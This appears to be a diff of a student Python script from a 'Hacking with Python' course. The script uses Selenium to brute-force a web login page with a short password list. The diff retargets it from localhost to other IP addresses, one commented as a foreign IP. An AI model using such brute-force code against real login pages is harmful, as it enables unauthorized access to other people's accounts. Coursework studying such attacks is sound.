@@ -11,13 +11,13 @@ print("Selenium Bruteforce")
 s = Service(executable_path=r"C:\Users\kevin\OneDrive\Desktop\6. Semester\Hacking with Python\chromedriver-win64\chromedriver.exe")
 driver = webdriver.Chrome(service=s)
 
-website = "http://127.0.0.1:5000/login"
-
+website = "http://141.87.56.119:5000/login"
+website2 = "http://141.87.56.58:5001/login" #fremde IP
 driver.get(website)
 
 # wordlist verwenden - da hardware hier sehr begrenzt, wird wordlist mit array simuliert 
-passwords = ["1234", "password", "de", "password2026", "admin"]
-username = "de"
+passwords = ["1234", "password", "de", "test", "password2026", "admin"]
+username = "de" 
 for passw in passwords:
     driver.get(website)
     time.sleep(5)
